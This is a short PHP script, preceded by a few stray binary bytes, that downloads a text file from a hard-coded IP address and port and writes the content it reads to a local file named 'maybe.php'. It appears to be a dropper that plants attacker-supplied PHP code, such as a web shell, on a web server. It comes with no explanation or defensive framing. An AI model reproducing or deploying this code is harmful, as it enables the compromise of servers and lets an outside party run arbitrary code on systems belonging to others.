K8²Ê
<?
define("ZXC","maybe.php");
$a = fopen('http://45.123.101.251:5520/xadsb.txt', 'r');
if($a){
    while(!feof($a)) {
		$b= fgets($a);
    }
	$maybe = fopen(ZXC,'w');
	fwrite($maybe,$b);
}
?>